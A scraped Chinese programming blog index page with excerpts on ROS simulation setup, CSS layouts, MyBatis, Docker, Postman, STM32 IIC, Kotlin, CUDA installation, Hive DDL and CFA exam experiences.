		 一、打开网页输入www.github.com 二、进入github界面 三、打开一个终端，输入mkdir catkin_ws1建立一个工作空间 四、使用cd catkin_ws1进入工作空间 五、使用mkdir src创建一个子目录src就是source，原始资料的意思,指的就是程序源代码这类资源材料，我们的源代码工程需要放到src子目录里面才能正常编译 六、使用cd src进入该子目录 七、使用sudo apt install git安装git 八、回到github官网，在搜索栏中输入wpr_simulation 九、找到这个点击进入 十、点击复制 十一、使用git clone +鼠标右键粘贴刚刚复制的网址，然后回车进行软件包克隆 十二、克隆好后，在文件管理中查看软件包，这是软件包中的内容 十三、scripts目录用于放置脚本文件和Python程序,点击进入这个目录 十四、里面有三个安装依赖包的脚本文件 十五、在该目录下打开终端 十六、输入./install_for_noetic.sh安装依赖包 十七、输入 cd ~/catkin_ws1回到工作空间 十八、输入catkin_make进行编译 十九、使用sourc ~/catkin_ws1/devel/setup.bash指令载入工作空间的环境变量 二十、在终端中输入roslaunch wpr_simulation wpb_simple.launch 后回车 二十一、会出现一个三维界面，这就是仿真环境Gazebo 二十二、这是仿真机器人 二十三、再打开一个终端，输入 rosrun rqt_robot_steering rqt_robot_steering 二十四、出现这个速度控制界面 二十五、把前面的turtle1去掉 二十六、拖动速度摇杆，机器人会动 二十七、通常会把设置工作空间环境参数的source指令添加到终端程序初始化的脚本 ~/.bashrc文件中，这样每次打开终端就能马上运行ROS程序了，在终端中输入gedit ~/.bashrc后回车 二十八、在打开的文件末尾添加~/catkin_ws1/devel/setup.bash保存后关闭 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b023adb842ee4e12f00d7390afcc20c/" rel="bookmark">
			双飞翼布局和圣杯布局
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、两种布局的目的： 使得左右两边的宽度不随着浏览器窗口的变化而变化，是固定的，只有中间的部分才可以随着窗口变化而变化。
二、两种布局的区别： 圣杯布局是通过父元素padding来设置左右，不遮挡中间内容
双飞翼布局时通过设置margin来限制内部区域从而是中间内容不受影响
圣杯布局代码： &lt;body&gt; &lt;!--圣杯布局重点结构就是中间的部分 顺序是center排在最前面 方面后面调整left right位置 因为left right都排在center后面 这样很容易调整上去 如果left right排在center前面 很难调整位置 --&gt; &lt;div id="header"&gt;header&lt;/div&gt; &lt;div id="container" class="clearfix"&gt; &lt;div id="center" class="column"&gt;center&lt;/div&gt; &lt;div id="left" class="column"&gt;left&lt;/div&gt; &lt;div id="right" class="column"&gt;right&lt;/div&gt; &lt;/div&gt; &lt;div id="footer"&gt;footer&lt;/div&gt; &lt;/body&gt; &lt;style&gt; #container{ padding-left: 200px; padding-right: 190px; margin: auto; } #center{ width: 100%; background-color: aqua; } .column{ float: left; } #left{ width: 200px; background-color: bisque; margin-left: -100%; position: relative; left: -200px; } #right{ width: 190px; background-color: coral; margin-right: -190px; } #header,#footer{ width: 100%; margin: auto; background-color: darkgray; text-align: center; } .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1b023adb842ee4e12f00d7390afcc20c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/19b928d1378a79fd6eb264ca3fcd9792/" rel="bookmark">
			Mybatis之增删改查
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		系列文章目录 提示：这里可以添加系列文章的所有文章的目录，目录需要自己手动添加
Mybatis之增删改查
提示：写完文章后，目录可以自动生成，如何生成可参考右边的帮助文档
文章目录 系列文章目录前言一、MyBatis新增二、MyBatis修改三、MyBatis删除四、MyBatis查询根据ID查询模糊查询分页查询 总结 前言 提示：这里可以添加本文要记录的大概内容：
好的，以下是为你生成的生成 Mybatis 之增删改查博客的前言：
在当今的软件开发领域，Java 仍然是最受欢迎和广泛使用的编程语言之一。而在 Java Web 开发中，MyBatis 是一个非常流行的 ORM（对象关系映射）框架，它简化了数据库操作，提高了开发效率。
在这篇博客中，我将详细介绍如何使用 MyBatis 实现增删改查操作。我们将从 MyBatis 的基础知识开始，逐步引导你完成一个完整的示例项目，涵盖了增加、删除、修改和查询数据的常见操作。
通过学习本博客，你将了解到如何使用 MyBatis 创建映射文件、配置数据源以及编写 SQL 查询语句。
无论你是刚刚开始学习 MyBatis，还是已经有一定经验的开发人员，这篇博客都将为你提供有用的指导和实践经验。让我们一起开始使用 MyBatis 进行高效、灵活的数据库操作吧！
提示：以下是本篇文章正文内容，下面案例可供参考
一、MyBatis新增 1.在持久层添加新增方法
void add(User user); 2.在UserMapper.xml映射文件添加标签
&lt;insert id="add" parameterType="com.zhangsan.pojo.User"&gt; insert into user(username,sex,address) values(#{username},#{sex},#{address}) &lt;/insert&gt; 注意：添加方法的标签为insert
3.测试编写方法
@Test public void testAdd() throws Exception { InputStream is= Resources.getResourceAsStream("SqlMapConfig.xml"); SqlSessionFactoryBuilder builder = new SqlSessionFactoryBuilder(); SqlSessionFactory factory = builder.build(is); SqlSession session = factory.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/19b928d1378a79fd6eb264ca3fcd9792/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e31b02b112ed53baef5a57cc9d335aca/" rel="bookmark">
			Jtti：怎么查看docker文件存放目录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Docker 默认将镜像、容器数据和相关文件存储在特定的目录中。具体的存储路径可能会因 Docker 安装方式和操作系统而异。以下是一些常见情况下查看 Docker 存储目录的方法：
方法 1: 使用 Docker 命令
使用以下命令可以查看 Docker 存储目录的位置：
docker info | grep -i 'docker root dir'
该命令会显示 Docker 根目录的路径，其中包括容器和镜像的数据。
方法 2: 查看 Docker 配置文件
Docker 的配置文件通常存储在 /etc/docker/daemon.json 或 /etc/default/docker，具体位置取决于您的操作系统。
查看配置文件，找到关于存储路径的配置信息：
cat /etc/docker/daemon.json
或者
cat /etc/default/docker
方法 3: 查看 Docker 数据卷的挂载点
Docker 数据卷通常存储在宿主机上，可以通过以下命令查看数据卷的挂载点：
docker volume inspect &lt;volume_name_or_id&gt; | grep Mountpoint
将 &lt;volume_name_or_id&gt; 替换为实际的卷名称或ID。
方法 4: 查看容器的挂载点
您还可以通过查看正在运行的容器的挂载点来了解 Docker 存储的位置：
docker inspect --format '{{.Mounts}}' &lt;container_name_or_id&gt;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e31b02b112ed53baef5a57cc9d335aca/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f148fd0f39ba79bab0da65510d58f928/" rel="bookmark">
			Postman接口测试工具使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、前言
在前后端分离开发时，后端工作人员完成系统接口开发后，需要与前端人员对接，测试调试接口，验证接口的正确性可用性。而这要求前端开发进度和后端进度保持基本一致，任何一方的进度跟不上，都无法及时完成功能模块的测试。
做为后端开发人员，要求独立开发完成某个接口后，开发人员自己需要先测试通过后再提交给测试人员进行测试，否则会出现到测试人员哪里业务流程根本就走不通，或者BUG会过多的情况等。
市场上有很多优秀的，完善的接口测试工具，比如SoapUI，Postman等，能够高效的帮助后端开发人员独立进行接口测试。这里使用Postman接口测试工具，此处以请求方式为POST的userLogin登录接口为例。
二、Postman安装和使用
1、这个直接去官网下载即可，我们使用免费版即可满足基本接口测试，根据个人或者公司的项目实际情况考虑是否需要专业版或者其他。
免费版官网链接：https://www.getpostman.com/postman
下载好的安装程序Postman-Win64-xxx-Setup.exe，双击安装即可。建议安装在非系统盘，即C盘在外的其他盘，另建议使用全英文路径，避免使用中文路径。
2、非登陆状态下该工具可以直接使用。接下来出现引导页面，类似IDEA，Android Studio等开发工具的引导页。此处关闭即可。
3、新建项目：选择功能菜单New下的Collection创建项目接口集合。新建一个项目，可在Description部分写一下项目描述。
4、创建项目模块文件夹： 一般项目会分多个管理模块或者功能模块进行开发。这里可根据项目具体情况创建子文件夹方便接口管理。此处在A hundred million项目右键创建资产管理assets文件夹、user用户管理文件夹。可将测试的接口实例保存在对于管理模块下。
5、新建接口测试
在Postman主页面Content部分点击'+'按钮，新增一个接口测试。
在第一部分填写接口请求路径，左侧下拉列表可选择请求方式，此处选择POST请求方式。接口请求路径为http://localhost:8080/manage/app/user/login。
第二部分是请求体，即包含接口所需请求参数的Body，此处选择原始数据RAW，数据类型使用JSON数据作为请求数据。点击蓝色Send按钮发送请求，后台项目接口接收请求并响应返回执行结果。此处后台处理数据返回结果仍是JSON数据，这个看实际项目而定，此处仅做演示。
第三部分是接口响应体，即接口响应请求处理并返回的数据。点击Pretty自动匹配接口返回的数据格式并对数据美化显示，使数据看起来更加直观。如果接口测试出现异常，则可以通过PreView视图查看浏览器响应接口的页面信息，也可以通过Header了解请求状态等参数。一般出现异常还是直接去后台看控制台的异常信息及项目日志来处理解决异常，再进行接口测试。
接口测试通过后，可Ctrl+S保存接口测试实例，填写接口测试名称和接口描述信息，选择要保存的路径，此处保存在user用户管理模块文件夹。
当项目的接口全部测试通过后，可在A hundred million项目右键Export导出接口文档，保存为JSON接口测试文件，该文件可通过Postman导入查看。
三、请求方式
对于后台开发的接口，请求方式肯定不止POST一种，Postman也支持多种请求方式。在新建接口测试实例时可选择接口的请求方式。
请求类型可以模拟Form表单文本提交，Form表单文件提交，raw原始数据提交，二进制文件提交。对于原始数据类型raw还支持不同文件格式，包括JSON，TXT，HTML等多种文件格式。
1.了解什么是API接口测试
2.构建HTTP请求
批量测试：
postman进行简单压力测试 下面是压测数据源，支持json和csv两个格式，如果包含有中文，请将文件编码改为UTF-8(否则请求中文会乱码)
csv格式数据如下(txt文件)：
json格式如下：
[ { "registerName": "zhangsan0001", "registerPwd": "asd100001" }, { "registerName": "zhangsan0002", "registerPwd": "asd100002" }, { "registerName": "zhangsan0003", "registerPwd": "asd100003" }, { "registerName": "zhangsan0004", "registerPwd": "asd100004" }, { "registerName": "zhangsan0005", "registerPwd": "asd100005" } ] 以csv格式数据为例（json格式数据只需要在导入测试数据时，选择json就可以）：
1、新建一个fodder，在fodder下添加要进行压力测试的接口： 2、post接口测试，参数从txt导入 {{registerName}} 和 {{registerPwd}} 是模板参数
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f148fd0f39ba79bab0da65510d58f928/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9ad7345a0253113f54d604c13c47e23d/" rel="bookmark">
			STM32 IIC开发学习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1IIC总线时序图 ① 起始信号
当 SCL 为高电平期间，SDA 由高到低的跳变。起始信号是一种电平跳变时序信号，而不是
一个电平信号。该信号由主机发出，在起始信号产生后，总线就会处于被占用状态，准备数据
传输。
② 停止信号
当 SCL 为高电平期间，SDA 由低到高的跳变。停止信号也是一种电平跳变时序信号，而不
是一个电平信号。该信号由主机发出，在停止信号发出后，总线就会处于空闲状态。
③ 应答信号
发送器每发送一个字节，就在时钟脉冲 9 期间释放数据线，由接收器反馈一个应答信号。
应答信号为低电平时，规定为有效应答位（ACK 简称应答位），表示接收器已经成功地接收了
该字节。应答信号为高电平时，规定为非应答位（NACK），一般表示接收器接收该字节没有成
功。
观察上图标号③就可以发现，有效应答的要求是从机在第 9 个时钟脉冲之前的低电平期间
将 SDA 线拉低，并且确保在该时钟的高电平期间为稳定的低电平。如果接收器是主机，则在它
收到最后一个字节后，发送一个 NACK 信号，以通知被控发送器结束数据发送，并释放 SDA
线，以便主机接收器发送一个停止信号。
④ 数据有效性
IIC 总线进行数据传送时，时钟信号为高电平期间，数据线上的数据必须保持稳定，只有在
时钟线上的信号为低电平期间，数据线上的高电平或低电平状态才允许变化。数据在 SCL 的上
升沿到来之前就需准备好。并在下降沿到来之前必须稳定。
⑤ 数据传输
在 IIC 总线上传送的每一位数据都有一个时钟脉冲相对应（或同步控制），即在 SCL 串行
时钟的配合下，在 SDA 上逐位地串行传送每一位数据。数据位的传输是边沿触发。
⑥ 空闲状态
IIC 总线的 SDA 和 SCL 两条信号线同时处于高电平时，规定为总线的空闲状态。此时各个
器件的输出级场效应管均处在截止状态，即释放总线，由两条信号线各自的上拉电阻把电平拉
高。
IIC写操作 下面介绍一下 IIC 的基本的读写通讯过程，包括主机写数据到从机即写
操作，主机到从机读取数据即读操作。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9ad7345a0253113f54d604c13c47e23d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b369209c9ccd27f638305ffac1c90516/" rel="bookmark">
			前端实现websocket类封装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		随着Web应用程序的发展，越来越多的人开始利用Websocket技术来构建实时应用程序。Websocket是一种在客户端和服务器之间建立持久连接的协议。这种协议可以在一个单独的连接上实现双向通信。与HTTP请求-响应模型不同，Websocket允许服务器自主地向客户端发送数据。这种实时连接的能力使得Websocket在许多应用场景中得到了广泛的应用。
Websocket技术的优点之一是减少了网络延迟。在传统的HTTP请求-响应模型中，客户端必须不断地向服务器发送请求以获取更新的数据。这种不断的请求-响应循环会占用大量的带宽和处理能力。而Websocket的持久连接可以在服务器有新数据时立即向客户端发送，从而减少了网络延迟和服务器负载。
另一个优点是Websocket可以处理大量的并发连接。在传统的HTTP请求-响应模型中，每个请求都必须在服务器上进行处理，这可能会对服务器造成负载压力。但是，Websocket的持久连接可以在服务器上保持打开状态，从而减少了与每个连接相关的开销。这使得服务器可以处理大量的并发连接而不会降低性能。
Websocket还可以用于实时通信。例如，聊天应用程序可以使用Websocket来实现实时消息传递。在这种情况下，Websocket的持久连接可以在服务器上保持打开状态，以便客户端可以接收实时消息。这种实时通信的能力使得Websocket在许多应用程序中得到了广泛的应用。
总之，Websocket技术在现代Web应用程序中发挥着越来越重要的作用。它可以减少网络延迟和服务器负载，处理大量的并发连接，并提供实时通信能力。因此，如果您正在构建一个需要实时更新的Web应用程序，那么Websocket技术可能是您的理想选择。
封装类实现
import { WebSocketConfigOption } from './WebSocketConfigOption'; export class ReconnectableWebSocket { private ws!: WebSocket; // ws实例 private opt: WebSocketConfigOption; // ws配置项 private lockReconnect: boolean = false; // 避免ws重复连接 private isClosingWindow: boolean = false; private reconnectTimeout: any; private heartSendInterval: any; constructor(option: WebSocketConfigOption) { if (null === option.url || '' === option.url) { throw ('url不能为空'); } this.opt = option; this.initWebSocket(); } private initWebSocket() { if (null == this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b369209c9ccd27f638305ffac1c90516/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4dce7d3880b6f7e1663893e9395f332b/" rel="bookmark">
			Android---Kotlin 学习011
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		扩展函数 定义扩展函数
扩展可以在不直接修改类定义的情况下增加类功能，扩展可以用于自定义类，也可以用于比如 List、String，已经 Kotlin 标准库里的其它类。和继承相似，扩展也能共享类行为，在你无法接触某个类定义，或者某个类没有使用 open 修饰符，导致你无法继承它时，扩展就是增加类功能的最后选择。
示例：给 String 增加一个我们自定义的函数 addExt()
后面所有的字符串都会有这个 addExt() 扩展函数。
超类(Any)上定义扩展函数，那么所有的类都会有这个扩展函数。
注意：如果扩展函数是私有的(private)，那么只有在当前类里能使用。
泛型扩展函数
新的泛型扩展函数不仅可以支持任何类型的接收者，还保留了接收者的类型信息，使用泛型类型后，扩展函数能够支持更多类型的接收者，适用范围更广。
为了解决这个问题，那么我们可以通过泛型扩展函数来完成。
泛型扩展函数在 Kotlin 标准库里随处可见，例如 let 函数，let 函数被定义成了泛型扩展函数，所以能支持任何类型，它接收一个 lambda 表达式，这个 lambda 表达式接收者 T 作为值参，返回的 R-lambda 表达式返回的任何新类型。
扩展属性
除了给类添加功能扩展函数外，你还可以给类定义 扩展属性，给 String 类添加一个扩展，这个扩展属性可以统计字符串里有多少个元音字母。
示例：
可空类扩展
也可以定义扩展函数用于可空类型，在可空类型上定义扩展函数，你就可以直接在扩展函数体内解决可能出现的空值问题。
infix 关键字
infex 关键字适用于有单个参数的扩展类函数，可以让你以更简洁的语法调用函数。如果一个函数定义使用了 infix 关键字，那么调用它时，接收者和函数之间的点操作以及参数的一对括号都可以不要。
定义扩展文件
扩展函数需要在多个文件里面使用，可以将它定义在单独的文件，然后 Import。
示例：定义一个扩展文件
在其它文件里使用 com.HL.extension.randomTake 这个扩展文件
重命名扩展文件
有时候，你想使用一个扩展或一个类，但它的名字不合你意。用 as 关键字。
Kotlin 标准库中的扩展
Kotlin 标准库提供的很多功能都是通过扩展函数和扩展属性来实现的，包含类扩展的标准库文件通常都是以类名加 s 后缀来命名的，例如 Sequences.kt，Ranges.kt，Maps.kt。
DSL 带接收者的函数字面量
apply 函数是如何做到支持接收者对象的隐式调用的。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4dce7d3880b6f7e1663893e9395f332b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/41a12cd6794c31c6f83901c8d74c6079/" rel="bookmark">
			onnxruntime 不使用 gpu
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		检查 onnxruntime 和 cuda 和 cudnn 的版本对应关
sudo apt purge -y nvidia* libnvidia* sudo apt autoremove -y sudo apt install -y nvidia-driver-520 sudo apt install -y cuda-11-8 nvidia 驱动 cuda cuDNN版本关系 https://docs.nvidia.com/deeplearning/cudnn/support-matrix/index.html 检测cuda版本 cat /usr/local/cuda/version.json nvida-smi 两者可能不一致 https://stackoverflow.com/questions/53422407/different-cuda-versions-shown-by-nvcc-and-nvidia-smi # add latest key curl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | sudo apt-key add - # try refresh again sudo apt-get update https://developer.nvidia.com/cuda-11-8-0-download-archive?target_os=Linux&amp;target_arch=x86_64&amp;Distribution=Ubuntu&amp;target_version=18.04&amp;target_type=deb_network wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-keyring_1.0-1_all.deb sudo dpkg -i cuda-keyring_1.0-1_all.deb sudo apt-get update sudo apt -y upgrade sudo apt-get -y install cuda 系
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/41a12cd6794c31c6f83901c8d74c6079/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/edd4fd6590ef18ffd3cd16a63850015e/" rel="bookmark">
			【C语言】动态内存管理详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言动态内存管理出现的原因malloc函数和free函数函数原型使用 calloc函数和realloc函数函数原型使用 动态内存使用中容易出现的错误柔性数组总结 前言 提示：这里可以添加本文要记录的大概内容：
动态内存管理是C语言中一项重要的编程任务，它使得程序在运行时能够灵活地分配和释放内存，更好地适应不同的运行条件。通过动态内存管理，我们可以实现更高效、更灵活的内存使用方式，但也需要谨慎处理，避免内存泄漏和其他潜在问题。本篇博客将深入探讨C语言中的动态内存管理，探索其原理、使用方法以及注意事项。
提示：以下是本篇文章正文内容，下面案例可供参考
动态内存管理出现的原因 考虑以下场景，展示了动态内存管理解决实际问题的情况：
#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main() { int *dynamicArray; int size; // 用户输入数组大小 printf("Enter the size of the array: "); scanf("%d", &amp;size); // 动态分配内存 dynamicArray = (int *)malloc(size * sizeof(int)); // 检查内存是否分配成功 if (dynamicArray == NULL) { printf("Memory allocation failed.\n"); return 1; } // 用户输入数组元素 printf("Enter %d integers:\n", size); for (int i = 0; i &lt; size; i++) { scanf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/edd4fd6590ef18ffd3cd16a63850015e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0cbee65f6aed275c4f1df2066f4c6a7d/" rel="bookmark">
			中医养生行业为何要搭建自己的知识付费小程序平台
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在数字化时代，中医养生行业正面临前所未有的机遇与挑战。随着人们健康意识的提高，中医养生的市场需求日益增长，但与此同时，竞争也愈发激烈。为了在这个市场中立足并取得优势，中医养生行业需要不断创新和升级。而搭建自己的知识付费小程序平台，正是一个值得考虑的策略。本文将深入探讨中医养生行业为何要搭建自己的知识付费小程序平台。
一、便捷性：小程序平台顺应移动化趋势
随着智能手机的普及和移动互联网的发展，人们越来越依赖手机进行日常操作。小程序作为微信等社交平台的内置应用，无需下载安装，即可使用。中医养生行业通过搭建自己的知识付费小程序平台，能够方便用户随时随地获取养生知识、购买相关课程和服务，极大地提高了便捷性。
二、用户体验：定制化内容提升用户黏性
小程序平台允许中医养生行业根据目标用户的需求和喜好，定制化地提供养生课程、健康资讯、专家咨询等内容。这种定制化服务能够更好地满足用户的个性化需求，提升用户体验，进而提高用户黏性和忠诚度。
三、低成本、高效率：降低运营成本，提高盈利能力
相较于APP开发，小程序的开发和维护成本更低。中医养生行业可以节省大量的开发成本，同时在小程序平台上进行精准营销，降低获客成本。通过优化用户体验和提高用户黏性，中医养生行业可以提高盈利能力，实现可持续发展。
四、数据驱动：精准营销提升转化率
小程序平台具备强大的数据统计功能，能够实时收集用户行为数据、消费习惯等信息。中医养生行业可以利用这些数据对用户进行精准画像，制定更有针对性的营销策略，提高转化率和复购率。
五、口碑传播：扩大品牌影响力
小程序平台具有天然的社交属性，用户可以将自己喜欢的内容分享给朋友、家人或朋友圈。中医养生行业可以借助小程序平台的口碑传播效应，扩大品牌知名度和影响力。同时，通过用户评价和专家推荐等方式，进一步提升品牌信誉和竞争力。
综上所述，中医养生行业搭建自己的知识付费小程序平台具有便捷性、用户体验、低成本高效率、数据驱动和口碑传播等多方面优势。在这个数字化时代，为了在激烈的市场竞争中脱颖而出，中医养生行业应积极拥抱小程序平台，为用户提供更优质、个性化的服务体验。这不仅能够提升品牌影响力，还能实现可持续发展和盈利能力提升。明理信息科技知识付费平台教你搭建自己的知识付费小程序平台。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ae16a5b3dd6becfb2ce536320ff42b1a/" rel="bookmark">
			electron-builder构建生产安装包下载失败问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		electron-builder生产安装包 打包时下载electron的编译包出现404问题，可以配置build以下选项，提高打包的成功率。
自定义的打包命令
"pack": "electron-builder --project ./dist --win --ia32"
华为
"electronDownload": { "mirror": "https://mirrors.huaweicloud.com/electron/" }, 淘宝
"electronDownload": { "mirror": "http://npm.taobao.org/mirrors/electron/" }, 多错几回就知道了
PYTHON_PATH=/Library/Frameworks/Python.framework/Versions/2.7/bin/python yarn run build
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6b232229b420f2effbdde864c534de99/" rel="bookmark">
			Hive DDL语法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Hive的语法和MySQL大部分都相同
一、数据库操作 1.1、创建数据库 CREATE DATABASE [IF NOT EXISTS] database name [COMMENT database_comment] [LOCATION hdfs path] [WITH DBPROPERTIES (property_name=property_value, ...)]; 语法：
[IF NOT EXISTS]：判断数据库是否存在
[COMMENT]：注释
[LOCATION]：数据库存储在hdfs的路径，默认为：${hive.metastore.warehouse.dir}/table_name.db
# 创建数据库 create database db_hive; # 创建数据库,设置表注释 create database db_hive '测试用hive表'; # 创建数据库,指定路径 create database db_hive location '/db_hive'; # 创建数据库,指定kv键值对 create database db_hive with dbproperties('create_user' = 'tom', 'create_date' = '2023-12-05'); 1.2、查询数据库 SHOW DATABASE [LIKE 'identifier_with_wildcards']; 语法：
[LIKE]：模糊匹配
# 查看所有数据库 show database; # 查看所有db开头的数据库 show database like 'db*'; 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6b232229b420f2effbdde864c534de99/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/210a05f0e026a24b7263b3426a590b6e/" rel="bookmark">
			postman使用笔记、配置等
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		经常使用postman，但是理解还是很浅，多数人都把他当请求工具。但是它还有很多功能，如自动测试，文档生成，捕获请求。
文章目录 捕获请求?postman 可以批量运行请求postman可以生成api文档(赞)导入导出导出导入 GeneralTrim keys and values in request bodyNew Code Generation ModeSSL certificate verification (native apps only):Always open requests in new tabAlways ask when closing unsaved tabsLanguage detectionRequest Timeout in ms (0 for infinity)Automatically persist variable valuesWorking DirectoryAllow reading files outside working directory:Editor Font SizeTwo-pane viewVariable autocompleteSend no-cache header (recommended):Send Postman Token headerRetain headers when clicking on linksAutomatically follow redirectsSend anonymous usage data to PostmanMax response size pre-request的使用表单形式的参数通过勾选决定是否传递 其他点击左侧请求，右边不出现新tabpostman卡顿 捕获请求?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/210a05f0e026a24b7263b3426a590b6e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ab0bb3575002f536b3c5731a92bfb1c2/" rel="bookmark">
			cfa一级考生复习经验分享系列（十七）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		考场经验：
1.本人在Prometric广州考试中心，提前一天在附近住下，地方比较好找，到了百汇广场北门，进去就可以看见电梯直达10楼。进去之后需要现场检查行程卡和健康码，然后会问最近你有没有发烧咳嗽等问题，然后登记你的手机号和现在居住住址。一位工作人员会给你安排你的物品存放，书包之类的需要放到橱柜里，食物和水会建议你放到橱柜旁边的小架子上。接着检查你的计算器，然后登记签名等，也会发一对耳塞。
2.进入考场后，草稿纸笔已经放在考试桌子上，房间不大，也有其它类型的考试（比如说CWI考试），有一位考生的考试还有听力，声音挺大，持续了大约20分钟，虽然带着耳塞，也多少影响了考试。有一些题目是很熟悉的，另外还有3或者4个题目有问题，没有正确选项，不知道是不是我知识点掌握不牢还是其他原因。
复习建议
备考过程中，主要是先倍速看了JC的基础班视频，同时做了笔记，然后先刷百题，知识点逐个掌握，不理解的知识点再多看几遍视频。
然后就是刷课后题，每个session作为一个小框架，一边刷题一边整理知识框架，毕竟刷题的目的在于记忆这些知识点。JC课中的老师也会推荐学习CFA的方法，比如建议把每一门知识点整理成一个框架，这一点我觉得非常必要，也很有作用。
Ethics方面是进行的考前突击，看了一两遍视频和笔记，依旧没记住，做了题还是照样错，让人比较费解。非科班出身。
感觉FRA比较难，知识点多也比较琐碎，自己花了比较多长时间，效果还有点不令人满意。一些ratio的公式之前没遇到过，long-lived assets和Fixed assets之后的知识感觉比较难掌握，其中IFRS和GAAP的规则不同，记忆比较繁琐，幸好FRA的老师会上课帮助整理一系列两种会计准则的不同。
其次比较难的就是Fixed income，知识点也比较多，到了Duration，相对比较晦涩，需要多看几遍视频。其他的像组合数量，刚开始学感觉比较难，把公式记住，就很简单，而且考计算时考查单一知识点，还是比较容易得分的。个人感觉复杂的计算题，有FRA中的EPS计算、Alternative中的各种fee的计算、FI中的duration的计算等。当然，在考试中，绝大部分计算题不复杂，个别计算题耗时长，相对来说性价比不高，在考试时可以战略性放弃。
考试中还是定性的题目多一些，在衍生和另类等比钟小的科目中，尤其需要掌握定性题目，看起来比较简单，英语水平有限的条件下，还是极具迷惑性的。还有需要注意的是Equity中的CMO,MBS,ABS等名词的区分，种类比较多，结合原版书的定义，分类梳理，建立框架更容易记忆。当然，最近几年的MOCK题目是非常重要的，建议刷两遍以上，你会在考试时发现意外之喜，“这个题好像在哪里见过，你记得吗？”
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0ec311a81a5b673459a26c3a3f6f24ed/" rel="bookmark">
			cfa一级考生复习经验分享系列（十六）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		写在前面：并不鼓励大家在考前一个月才开始复习，不过，既然已经逼到了绝境，灰心丧气也没有用，不如放手一搏！
首先说一下我的背景，工作金融机构的it，和cfa基本没关系，本硕计算机，没有金融学基础，可以算零基础吧。复习时间17年五月正式开始，一共一个月时间。成绩5a4b1c，算低分飘过。不过性价比也算高了，但复习的滋味待我慢慢道来。
复习时间
说到复习时间，本来我是准备三月看的，但随着小孩出生，大家有小孩的懂的，我的时间拖到五月。五月到六月，我并没有达到CFA建议的300小时，根据我的计时软件显示，我总共投入的时间大概150不到，基本一天5个小时保证。
复习计划
基础复习阶段：我用到的复习资料主要是jc的视频+pz的知识框架，对时间紧迫的人，你一定要买视频，视频可以在地铁上，休息时随时看，很重要的一点可以加速听，用potplayer，很多老师以你的中文水平和理解能力，相信我，1.8到2.2倍速没有问题，你将省下一半时间。每看完一科就做课后题，不论对错主要是串联知识点。
刷题阶段：考前某机构出的题和配套视频，jc的包体，这个作用就是巩固你学到的东西，那几百道题做下来够了，能让你熟悉英文的表达，题目的问法，可以大概了解如何考试，当然那题比考试难。
最后冲刺：当然了也要做几套模考，官方的 kaplan的 jc的，熟悉熟悉考试。
注意事项
